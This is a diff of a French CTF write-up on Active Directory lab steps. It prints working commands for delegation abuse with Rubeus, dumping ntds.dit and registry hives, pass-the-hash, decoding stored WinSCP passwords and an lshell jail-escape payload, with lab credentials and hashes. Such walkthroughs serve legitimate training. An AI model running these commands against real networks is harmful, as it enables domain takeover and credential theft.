@@ -149,7 +149,7 @@ A wild flag appears !
 ---
 ---
 
-## II. Step 2 - A tale of JWT
+## II. Step 2 - Une histoire de JWT
 
 >  A ticket 'deadbeef' was submitted. Who's the victim ? 
 
@@ -1282,7 +1282,7 @@ _Note_ : Comme présenté dans le schéma situé dans l'introduction, CommandoVM
 Lorsque cette étape est réalisée, _CommandoVM_ est en mesure de ping le domaine `factory.lan`. _SharpHound_ peut être executé à l'aide de la commande suivante :
 
 ```bash
-(CommandVM) ➜ .\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn
+(CommandoVM) ➜ .\SharpHound.exe --Domain factory.lan --DomainController 172.16.42.5 --LDAPUser adminServer --LDAPPass '#3LLe!!estOuL@Poulette' --CollectionMethod All,GPOLocalGroup,LoggedOn
 ```
 
 Le fichier zip contenant les informations sera créé dans le dossier courant. En visualisant les données récupérées, deux éléments sont intéressants :
@@ -1311,7 +1311,7 @@ Cette attaque va permettre d'accéder au contrôleur de domaine en tant qu'admin
 
 Enfin, ces prérequis sont rempli dans notre cas. La relation que BloodHound a trouvé entre _DC01-WW2.FACTORY.LAN_ et _SvcJoinComputerToDom_ permet de réécrire l'attribut `msds-AllowedToActOnBehalfOfOtherIdentity`. Quant au contrôle d'un utilisateur ayant un SPN configuré, il faudrait ajouter une machine au domaine. En se basant sur la note __credentials.txt__, on sait que le compte _SvcJoinComputerToDom_ à cette fonction.
 
-### VIII.2. Exploitation
+### VIII.2. Mise en place de l'exploitation
 
 La reconnaissance étant terminée, le moment est venu d'exploiter cette vulnérabilité. Tout d'abord, il convient d'ajouter notre CommandoVM au domaine grâce au compte _SvcJoinComputerToDom_ :
 
@@ -1329,128 +1329,167 @@ Afun de s'assurer que CommandoVM est correctement relié au domaine, il suffit d
 _Fig 25_ : Liste des utilisateurs du domaine
 </center>
 
-### VIII.2. Resource Based Constrained Delegation
+Harmj0y a écrit un [article](https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/) détaillé sur cette attaque. Il a même fournit un [script](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff) en powershell pour l'automatiser. Son script a besoin de deux librairies pour fonctionner : [PowerView dans la branche dev](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) et [PowerMad](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1).
 
-Après un peu de recherche, on tombe carrément sur un ps1 exploitant le RBCD, script réalisé par harmj0y : https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
+#### VIII.2.a. Vérification des droits sur le domaine
 
-Pour réussir correctement cette exploitation, nous avons besoin des deux scripts suivants :
-
-* PowerView : https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
-* PowerMad : https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
-
-#### VIII.2.a. Verify right on AD
+Avant de commencer l'exploitation à proprement parler, il est préférable de vérifier si l'utilisateur __SvcJoinComputerToDom__ possède les droits permettant l'exploitation de cette délégation :
 
 ```bash
-Import-Module .\powermad.ps1
-Import-Module .\powerview.ps1
-$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
-$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
-$ACE
+(CommandoVM) ➜ Import-Module .\powermad.ps1
+(CommandoVM) ➜ Import-Module .\powerview.ps1
+(CommandoVM) ➜ $AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid
+(CommandoVM) ➜ $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}
+(CommandoVM) ➜ $ACE
+(CommandoVM) ➜ ConvertFrom-SID $ACE.SecurityIdentifier
+FACTORY\SvcJoinComputerToDom
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_propertywrite.png)
-_Fig 25_ : WriteProperty in the AD
+_Fig 26_ : Droit "WriteProperty"
+</center>
 
-On a bien les droits d'écriture. On va en avoir besoin pour modifier la variable `msds-allowedtoactonbehalfofotheridentity`.
+L'utilisateur __SvcJoinComputerToDom__ possède les droits __WriteProperty__ sur le DC. L'une des conditions est vérifiée, il est possible de modifier l'attribut `msds-allowedtoactonbehalfofotheridentity`.
 
-```bash
-ConvertFrom-SID $ACE.SecurityIdentifier
+#### VIII.2.b. Ajout d'une machine au domaine 
 
-FACTORY\SvcJoinComputerToDom
-FACTORY\SvcJoinComputerToDom
-```
-
-#### VIII.2.b. Adding machine to domain
-
-Pour que l'attaque fonctionne il faut un compte avec un SPN, si on en a pas on peut en ajouter un grâce au MachineAccountQuota (par défaut on peut ajouter 10 machines dans le domaine).
-
-Il existe New-MachineAccount dans powermad :
+Afin de remplir la seconde condition, il est possible d'ajouter une machine au domaine avec des SPN mis en place par défaut. La fonction _New-MachineAccount_ de _PowerMad_ permet cette action :
 
 ```bash
-New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+(CommandoVM) ➜ New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
 [+] Machine account attackersystem added
 ```
 
-#### VIII.2.c. Setting msDS-AllowedToActOnBehalfOfOtherIdentity 
+_Note_ : Par défaut, un utilisateur ne peut ajouter que 10 machines dans le domaine, c'est le __MachineAccountQuota__. Dans notre cas ce n'est pas important, car nous disposons d'un compte spécifique pour l'ajout de machine dans le domaine.
 
-On va juste set le tableau pour un compte et changer le sid avec notre machine qui contient un SPN :
+#### VIII.2.c. Modification de msDS-AllowedToActOnBehalfOfOtherIdentity  
+
+Harmj0y explique dans son article que même lui n'a pas complètement compris la structure de __msDS-AllowedToActOnBehalfOfOtherIdentity__. Pour modifier cette structure, il a donc extrait le champ désiré et converti au format __Security Descriptor Definition Language__ (SDDL). Ce format est utilisé pour convertir les descripteur de sécurité en chaine de caractère. De ce fait, il est possible de modifier le SID par celui du SPN contrôlé. Lorsque la structure est correctement modifiée, il est nécessaire de faire la conversion inverse et l'enregistrer dans le champ __msDS-AllowedToActOnBehalfOfOtherIdentity__.
 
 ```bash
-$ComputerSid = Get-DomainComputer bitedepoulet -Properties objectsid | Select -Expand objectsid
-$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
-$SDBytes = New-Object byte[] ($SD.BinaryLength)
-$SD.GetBinaryForm($SDBytes, 0)
-Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
-$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
-$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
-$Descriptor.DiscretionaryAcl
+(CommandoVM) ➜ $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+(CommandoVM) ➜ $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+(CommandoVM) ➜ $SDBytes = New-Object byte[] ($SD.BinaryLength)
+(CommandoVM) ➜ $SD.GetBinaryForm($SDBytes, 0)
+(CommandoVM) ➜ Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+(CommandoVM) ➜ $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+(CommandoVM) ➜ $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+(CommandoVM) ➜ $Descriptor.DiscretionaryAcl
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_acequalifier.png)
-_Fig 26_ : AccessAllowed
+_Fig 27_ : AccessAllowed
+</center>
 
-Maintenant que tout est en place, il faut faire la tambouille avec le S4U.
+La figure 27 ci-dessus démontre que tous les prérequis de l'exploitation sont mis en place avec succès.
 
-#### VIII.2.d. S4U2Self / S4U2Proxy
+### VIII.3. Exploitation
 
-Pour réussir à impersonate `Administrator`, je vais utiliser Rubeus, et là on a une super erreur :
+Pour rappel, l'exploitation se fait en abusant des mécanismes __S4U2Self__ et __S4U2Proxy__. Il existe deux outils pour abuser de ce type de délégation : Kekeo et Rubeus. Le premier est developpé par GentilKiwi aka Benjamin Delpy, qui est aussi le développeur de Mimikatz. Le second est est développé par harmj0y. Les deux outils sont assez similaire. Harmj0y a expliqué pourquoi il a développé Rubeus dans un [article](https://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/) sur son blog.
 
+_Note_ : Par défaut, Rubeus n'est pas dans CommandoVM. Cependant, Visual Studio est installé, il suffit de compiler le projet disponible sur le GitHub.
+
+#### VIII.3.a. Abus de S4U2Self / S4U2Proxy
+
+Pour abuser de ces mécanismes, Rubeus prend différents paramètres :
+
+* /user : Le SPN que nous contrôlons ;
+* /rc4 : Le mot de passe de ce compte au format RC4 ;
+* /impersonateuser : L'utilisateur à usurper ;
+* /msdsspn : Le service désiré sur le serveur désiré ;
+* /ptt : Pass the ticket.
+
+Le seul paramètre manquant est le mot de passe de __attackersystem$__ au format RC4. Heureusement, Rubeus permet de le récupérer :
+
+```bash
+(CommandoVM) ➜ .\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:factory.lan
+[...]
+rc4_hmac : EF266C6B963C0BB683941032008AD47F
+[...]
+```
+
+Ayant tous les paramètres, il est temps d'abuser de ces mécansimes... Enfin presque. Pour des soucis de pérennité, Akerva a fait le choix de restaurer l'ensemble des machines à leur état d'origine, et ceux toute les heures. Causant ainsi l'erreur suivante :
+
+<center>
 ![](/img/writeups/wonkachall2019/step8_kerberos_issue.png)
-_Fig 27_ : Kerberos error
+_Fig 28_ : Erreur Kerberos
+</center>
 
-Pour fixer cette erreur, il suffit de synchroniser l'heure de la machine client avec le DC, pour ça il y a la commande `net user /domain /set` :
+L'erreur __KRB_AP_ERR_SKEW__ signifie _Kerberos Authentication failed due to time skew_. Cette erreur survient lorsque l'horloge du domaine contrôleur et celle du client ont trop de différence. En effet, si le domaine est restauré toute les heures, alors l'horloge aussi. Pour synchroniser les deux horloges, la commande suivante est nécessaire : `net user /domain /set`.
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_issue_done.png)
-_Fig 28_ : Error fixed
+_Fig 29_ : Erreur corrigé et exécution de Rubeus
+</Center>
 
-Une fois la commande Rubeus terminée, un ticket `Administrator @ factory.lan` est en mémoire :
+La commande Rubeus étant terminée correctement, un ticket __Administrator @ factory.lan__ a été créé en mémoire :
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_rubeus_ticket.png)
-_Fig 29_ : Administrator ticket
+_Fig 30_ : Ticket Kerberos de l'administrateur de domaine
+</center>
 
-Et grâce à ce ticket, on peut accéder au disque du DC :
+Le ticket "administrateur de domaine" étant én mémoire, il est possible d'accéder au disque __C:__ du contrôleur de domaine :
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_dir_allowed_on_dc.png)
-_Fig 30_ : Disque C du DC
+_Fig 31_ : Disque C du DC
+</center>
 
-### VIII.3. Get NTDS.dit
+### VIII.4. Acquisition du NTDS.dit
 
-Maintenant qu'on a impersonate l'utilisateur Administrator, il est possible de se connecter au Domain Controller via psexec. Maintenant dans la pratique, c'est un peu capricieux... Mais bon, il suffit d'une fois et de récupérer le ntds.dit !
+Ayant les droits administrateur de domaine, il est possible de se connecter au contrôleur de domaine via __psexec__. Cet outil fait parti des Sysinternals de Microsoft, comme _procdump_ utilisé précédemment.
 
 ```bash
 PsExec.exe \\dc01-ww2.factory.lan cmd.exe
 ```
 
-Une fois connecté, on va utiliser l'utilitaire `vssadmin` pour récupérer le `ntds.dit` :
+Il n'est pas possible d'accéder au fichier __ntds.dit__ sur un système en cours de fonctionnement, même en étant administrateur de domaine. Cependant, il est possible d'utiliser __vssadmin__ pour récupérer une copie du disque __C:__ et ainsi récupérer le _ntds.dit_ dans cet instantanné :
 
 ```bash
 vssadmin create shadow /for=C:
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_vssadmin.png)
-_Fig 31_ : Using vssadmin to extract ntds.dit
+_Fig 32_ : Copie du ntds.dit en passant par vssadmin
+</center>
 
-Une fois que le ntds.dit a été récupéré, il me faut aussi la base `system` pour lire les différents hashs :
+Enfin, pour que _secretsdump.py_ puisse retrouver les hashs disponibles dans le _ntds.dit_, il est nécessaire de récupérer la base __system__ dans la registry Windows :
 
 ```bash
 reg.exe save hklm\system c:\windows\temp\system.save
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_dumpsystem.png)
-_Fig 32_ : Extracting system base
+_Fig 33_ : Extraction de la base system
+</center>
+
+Les UNC path permettent de copier les fichiers générés sur CommandoVM :
+
+```bash
+(DC01-WW2 via psexec) ➜ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\ntds.dit C:\Windows\Temp\
+(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\ntds.dit .
+(CommandoVM) ➜ copy \\dc01-ww2.factory.lan\C$\Windows\Temp\system.save .
+```
 
 ### VIII.4. Get hashes
 
-Maintenant, il ne reste plus qu'à rappatrier tous ça à la maison et utiliser `secretsdump.py` :
+L'outil __secretsdump.py__ est un script de la suite _impacket_. Dans le cadre de cette épreuve, cet outil va extraire les différents hash du _ntds.dit_ :
 
 ```bash
-secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL
+(KaliVM) ➜ secretsdump.py -system .\system.save -ntds .\ntds.dit LOCAL
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step8_ntdsextaction_krbtgt.png)
-_Fig 32_ : Extracting hash
+_Fig 34_ : Extracting hash
+</center>
 
-Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
+Le flag étant le sha256 du hash de l'utilisateur __krbtgt__. Ayant ce hash, il est maintenant possible de créer un golden ticket en tant qu'administrateur de domaine.
 
 ### VIII.5. Flag
 
@@ -1464,10 +1503,16 @@ Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
 2. __Rohan Vazarkar__, _BloodHound 2.1: The Fix Broken Stuff Update_, cptjesus.com : https://blog.cptjesus.com/posts/bloodhound21
 3. __PenTestPartners__, _Bloodhound walkthrough. A Tool for Many Tradecrafts_, Blog de PenTestPartners : https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/
 4. __Pixis__, _Resource-Based Constrained Delegation - Risques_, hackndo : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
-2. __harmj0y__, _A Case Study in Wagging the Dog: Computer Takeover_, Blog de harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
-3. __Elad Shamir__, _Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory_, Blog de shenaniganslabs : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
-4. __Dirk-jan Mollema__, _“Relaying” Kerberos - Having fun with unconstrained delegation_, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
-5. __swisskyrepo__, _PayloadsAllTheThings_, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit
+5. __harmj0y__, _A Case Study in Wagging the Dog: Computer Takeover_, Blog de harmj0y : https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
+6. __Elad Shamir__, _Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory_, Blog de shenaniganslabs : https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+7. __Microsoft__, _Security Descriptor Definition Language_, Documentation Microsoft : https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language
+8. __Dirk-jan Mollema__, _“Relaying” Kerberos - Having fun with unconstrained delegation_, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
+9. __Microsoft__, _Kerberos Authentication failed due to time skew_, Documentation Microsoft : https://blogs.msdn.microsoft.com/asiatech/2009/04/26/kerberos-authentication-failed-due-to-time-skew/
+10. __Microsoft__, _vssadmin_, Documentation Microsoft : https://docs.microsoft.com/fr-fr/windows-server/administration/windows-commands/vssadmin
+11. __swisskyrepo__, _PayloadsAllTheThings_, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit
+
+---
+---
 
 ## IX. Step 9 - Not so hashed
 
@@ -1475,53 +1520,52 @@ Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
 
 ### TL;DR
 
-1. Le psexec étant un peu capricieux, il est possible de Pass the hash avec `adminWorkstation`
-2. Voir que la machine utilise `winscp`
-3. Après quelques recherches sur internet, il est possible de récupérer des infos de WinSCP dans les registres
-4. Récupérer le hash réversible de `veruca` dans les registres : `HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78`
-5. Récupérer les identifiants : `veruca : CuiiiiYEE3r3!`
-6. Ajouter une route vers le sous réseau de la machine de veruca
-7. S'y connecter en SSH
+1. Il est possible de se connecter avec le hash de l'utilisateur __adminWorkstation__ à la dernière machine (PC01-DEV) de ce LAN ;
+2. Remarquer que la machine utilise __WinSCP__ ;
+3. N'ayant pas de master password sur WinSCP, il est possible de récupérer des informations dans les clés de registre ;
+4. Récupérer le hash réversible de __veruca__ dans la clé de registre : `HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions\veruca@172.16.69.78` ;
+5. Décoder le hash et recueillir les identifiants : `veruca : CuiiiiYEE3r3!` ;
+6. Ajouter une route vers le sous réseau contenant la machine de _veruca_ ;
+7. Se connecter à PC01-DEV en SSH.
 
 ---
 
-### IX.1. State of the art
+### IX.1. Pass the hash
 
-Avec le hash de krbtgt en notre possession, on peut faire un golden ticket. Ca évitera de nous farcir toute la tambouille avec Rubeus à chaque fois. Cependant, maintenant qu'on a les hash de tout le monde, un pass the hash devrait aussi faire l'affaire.
-Il reste une machine qu'on a pas tapé encore : `172.16.42.101`
+Ne restant qu'une machine dans le réseau et ayant l'ensemble des hash des utilisateurs du domaine, nous sommes en droit de se dire qu'il y a un lien entre les deux. En effet, il est possible de se connecter à différents services d'un domaine en se servant du hash du mot de passe plutôt que du mot de passe lui même.
 
-### IX.2. Pass the hash
-
-Bon, j'ai une technique pas très élégante, mais j'en avais marre de jouer à la roulette russe avec le psexec. J'ai donc bruteforce les pass the hash pour voir lequel arrive à se connecter. Ca n'a pas été bien long puisque j'ai commencé avec les utilisateurs ayant "admin" dans le nom :
+En filtrant sur les utilisateurs contenant "admin" dans le nom, le bruteforce a été relativement rapide :
 
 ```bash
-➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
+(KaliVM) ➜ cat ntds_clear|grep -i 'admin' | grep ':::' 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:7fc0c9c128598429119dbc01f450a603:::
 adminWorkstation:1103:aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d:::
 adminServer:1104:aad3b435b51404eeaad3b435b51404ee:e0ae639c0ee92b2118a1081376c940a0:::
 ```
 
-Et finalement `adminWorkstation` a fonctionné comme un charme :
+Finalement l'utilisateur `adminWorkstation` peut se connecter à la dernière machine :
 
 ```bash
-cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'
+(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY'
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step9_pth.png)
-_Fig 32_ : Pass the hash works !
+_Fig 35_ : Connxion à 172.16.42.101
+</center>
 
-### IX.3. Veruca's password
+### IX.2. Identifiant de Veruca
 
-On commence avec un demi shell via wmiexec :
+Il est possible d'exécuter des commandes arbitraires en utilisant la technique du Pass the hash. La suite _impacket_ possède __wmiexec.py__ :
 
 ```bash
-/usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
+(KaliVM) ➜ /usr/share/doc/python-impacket/examples/wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
 ```
 
-Du coup on sait qu'il y a un utilisateur `adminWorkstation`, c'est parti pour fouiller dans ses fichiers. Il n'y a rien, enfin il n'y a pas de photos / vidéos ou fichiers particulier. Par contre, on a un lnk intéressant :
+Des raccourcis intéressants sont accessibles dans les fichiers de l'utilisateur __adminWorkstation__ :
 
 ```bash
-C:\Users\adminWorkstation>dir /a Desktop
+(PC01-DEV) ➜ C:\Users\adminWorkstation>dir /a Desktop
  Volume in drive C has no label.
  Volume Serial Number is F660-81CF
 
@@ -1536,67 +1580,97 @@ C:\Users\adminWorkstation>dir /a Desktop
                2 Dir(s)  11,220,193,280 bytes free
 ```
 
-Avec un peu de recherche, on découvre qu'il est possible de récupérer des infos dans WinSCP lorsqu'il n'y a pas de master key. Pour récupérer les infos de veruca dans WinSCP, il existe deux méthodes, une méthode "à la main" et une méthode automatisée.
+Il est possible de récupérer des informations dans la registry Windows s'il n'y a pas de master password sur WinSCP. Pour avoir accès aux informations de Veruca, il existe deux méthodes : une méthode "à la main" et une automatisée.
 
-#### IX.3.a. Method 1 - Boring way
+#### IX.2.a. Méthode 1 - À la main
 
-Avec le hash de `adminWorkstation`, on peut se connecter via wmiexec :
+Étant connecté sur la machine, il suffit de requêter la registry Windows afin d'obtenir les informations désirées :
 
-```bash
-wmiexec.py adminWorkstation@172.16.42.101 -hashes aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d
-```
-
-Maintenant, il suffit de requêter la registry pour récupérer les infos désirées :
-
+<center>
 ![](/img/writeups/wonkachall2019/step9_regquery.png)
-_Fig 33_ : Get veruca's password and IP - boring way
+_Fig 35_ : Obtention des identifiants et IP de Veruca 1/2
+</center>
 
-Grâce au binaire trouvé ici : https://github.com/anoopengineer/winscppasswd/releases
-
-Il est alors possible de décoder le mot de passe de Veruca sur la Commando :
+Il existe un [binaire](https://github.com/anoopengineer/winscppasswd/releases) sur GitHub permettant de décoder les hash de WinSCP. Ci-dessous le mot de passe de Veruca en clair :
 
 ```bash
-.\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE
+(CommandoVM) ➜ .\winscppasswd 172.16.69.78 veruca A35C4356079A1F0870112F60D87D2A392E293F3D6D6B6E726D6A726A65726B641F29353535350519196F2E6F7DEB849B0EDE
 
 CuiiiiYEE3r3!
 ```
 
-#### IX.3.b. Method 2 - Automated way
+#### IX.2.b. Méthode 2 - Automatisée
 
-Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce, une fois que j'avais flag évidemment ;)
+Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce. Une fois que l'épreuve ait été validée, évidemment ;)
 
-La méthode automatisée, se fait avec CrackMapExec, et ça marche vachement bien :
+L'outil _CrackMapExec_ possède un module __invoke_sessiongopher__ permettant de récupérer des informations sensibles dans différents programmes tel que : PuTTY, WinSCP, FileZilla, SuperPuTTY, et RDP en utilisant _SessionGopher_.
 
 ```bash
-cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
+(KaliVM) ➜ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee:8392dd649c5c285244fddd49695d188d' -d 'FACTORY' -M invoke_sessiongopher
 ```
 
+<center>
 ![](/img/writeups/wonkachall2019/step9_cme_veruca.png)
-_Fig 34_ : Get veruca's password and IP - automated way
+_Fig 36_ : Obtention des identifiants et IP de Veruca 2/2
+</center>
 
-On a donc les identifiants :
+### IX.3. Connexion SSH sur le poste de Veruca
+
+Les informations de Veruca sont donc le suivants :
 
 > veruca@172.16.69.78 : CuiiiiYEE3r3!
 
-### IX.4. SSH veruca's machine
-
-Bien, on touche au but. Nous avons les identifiants de Veruca et son IP, qui est sur une autre route que celle montée par le VPN. Il suffit d'en déclarer une nouvelle :
+Un rapide coup d'oeil sur l'adresse IP montre qu'elle fait parti d'un autre réseau. Jusqu'à présent nous étions le réseau __172.16.42.0/24__. Afin d'accéder au second réseau, l'ajout d'une route est nécessaire. Comme présenté dans le schéma situé dans l'introduction, ma route sera sur mon hôte Windows 10 :
 
 ```bash
-➜ ip r | grep tun0
-10.8.0.1 via 10.8.0.9 dev tun0 
-10.8.0.9 dev tun0 proto kernel scope link src 10.8.0.10 
-172.16.42.0/24 via 10.8.0.9 dev tun0 
+(HoteWin10) ➜ route print |findstr 10.8.0.10
+         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
+         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
+        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
+        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
+      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
+        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
+  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291
 
-➜ sudo ip route add 172.16.69.0/24 via 10.8.0.9 dev tun0
+(HoteWin10) ➜ route ADD 172.16.69.0 MASK 255.255.255.0 10.8.0.9
+ OK!
+
+(HoteWin10) ➜ route print |findstr 10.8.0.10
+         10.8.0.1  255.255.255.255         10.8.0.9        10.8.0.10    291
+         10.8.0.8  255.255.255.252         On-link         10.8.0.10    291
+        10.8.0.10  255.255.255.255         On-link         10.8.0.10    291
+        10.8.0.11  255.255.255.255         On-link         10.8.0.10    291
+      172.16.42.0    255.255.255.0         10.8.0.9        10.8.0.10    291
+      172.16.69.0    255.255.255.0         10.8.0.9        10.8.0.10     36
+        224.0.0.0        240.0.0.0         On-link         10.8.0.10    291
+  255.255.255.255  255.255.255.255         On-link         10.8.0.10    291
 ```
 
-C'est le moment de se connecter en SSH :
+Il est désormais possible de se connecter en SSH à la machine de Veruca avec mes VM en NAT :
 
+```bash
+(KaliVM) ➜ ssh veruca@172.16.69.78                                                                                        
+veruca@172.16.69.78's password: 
+[...]
+
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ whoami
+veruca
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ hostname
+SRV01-WEB-WW3
+(SRV01-WEB-WW3) ➜ veruca@SRV01-WEB-WW3:~$ ip a
+[...]
+2: ens18: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 7a:0a:61:1a:36:65 brd ff:ff:ff:ff:ff:ff
+    inet 172.16.69.78/24 brd 172.16.69.255 scope global ens18
+[...]
+```
+
+<center>
 ![](/img/writeups/wonkachall2019/step9_flag.png)
-_Fig 35_ : SSH connection and flag
+_Fig 37_ : SSH connection and flag
+</center>
 
-### IX.5. Flag
+### IX.4. Flag
 
 > 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2
 
@@ -1607,6 +1681,10 @@ _Fig 35_ : SSH connection and flag
 1. __Paul Lammertsma__, _Where does WinSCP store site's password?_, SuperUser : https://superuser.com/questions/100503/where-does-winscp-store-sites-password
 2. __anoopengineer__, _WinSCP Password Extractor/Decrypter/Revealer_, GitHub : https://github.com/anoopengineer/winscppasswd/
 3. __Vivek Gite__, _Linux route Add Command Examples_, cyberciti : https://www.cyberciti.biz/faq/linux-route-add/
+4. __Walter Glenn__, _How to Add a Static TCP/IP Route to the Windows Routing Table_, howtogeek : https://www.howtogeek.com/howto/windows/adding-a-tcpip-route-to-the-windows-routing-table/
+
+---
+---
 
 ## X. Step 10 - The Great Escape
 
@@ -1614,29 +1692,33 @@ _Fig 35_ : SSH connection and flag
 
 ### TL;DR
 
-1. Trouver l'autre machine via ARP : `cat /proc/net/arp`
-2. Remarquer qu'il y a deux serveurs web installés : Apache et nginx
-3. Dans la configuration du nginx, trouver la racine du site : `/usr/share/nginx/dev3.challenge.akerva.com`
-4. Récupérer une clé privé SSH dans ce dossier
-5. Grâce à l'indice de Akerva, on sait qu'il faut se connecter avec l'utilistaeur `violet`
-6. Attérir dans un `lshell`
-7. Sur le GitHub de `lshell`, il y a une issue de sécurité qui va nous permettre de s'échapper de la jail
-8. Executer le payload : `echo opmd && cd () bash && cd` et récupérer le flag
+1. Trouver l'autre machine via ARP : `cat /proc/net/arp` ;
